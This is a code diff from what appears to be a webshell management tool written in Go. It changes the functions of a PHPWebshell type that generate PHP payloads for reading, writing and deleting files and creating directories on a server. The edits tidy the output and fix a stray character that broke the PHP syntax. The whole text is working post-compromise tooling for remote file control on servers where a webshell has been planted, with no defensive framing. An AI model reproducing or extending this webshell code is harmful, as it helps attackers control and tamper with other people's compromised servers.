@@ -142,14 +142,17 @@ try {
     echo nl2br($content);
 } catch (Exception $e) {
     echo "Error://[".$e->getMessage()."]";
-}`, file.FilePath, file.FilePath)
+}
+`, file.FilePath, file.FilePath)
 	return []byte(code)
 }
 
 // 写文件
 func (p *PHPWebshell) WriteFile(file *core.FileInfo, content string) []byte {
 	code := fmt.Sprintf(`$path = "%s"; 
-file_put_contents($path, "%s");`, file.FilePath, content)
+file_put_contents($path, "%s");
+echo "ok";
+ `, file.FilePath, content)
 	return []byte(code)
 }
 
@@ -166,7 +169,7 @@ try {
             throw new Exception("无法删除文件: $path");
         }
     }
-    elseif (is_dir($path)) {录
+    elseif (is_dir($path)) {
         $files = array_diff(scandir($path), array('.', '..'));
         foreach ($files as $file) {
             $filePath = $path . DIRECTORY_SEPARATOR . $file;
@@ -186,7 +189,7 @@ try {
             }
         }
         if (rmdir($path)) {
-            echo "目录及其内容已删除: $path\n";
+            echo "ok";
         } else {
             throw new Exception("无法删除目录: $path");
         }
@@ -195,7 +198,8 @@ try {
     }
 } catch (Exception $e) {
     echo "Error://[" . $e->getMessage() . "]";
-}`, path)
+}
+`, path)
 	return []byte(code)
 }
 
@@ -211,7 +215,8 @@ if (!is_dir($directoryPath)) {
     }
 } else {
     echo "Error://[Directory already exists: " . $directoryPath ."]";
-}`, dirName)
+} 
+ `, dirName)
 	return []byte(code)
 }
 
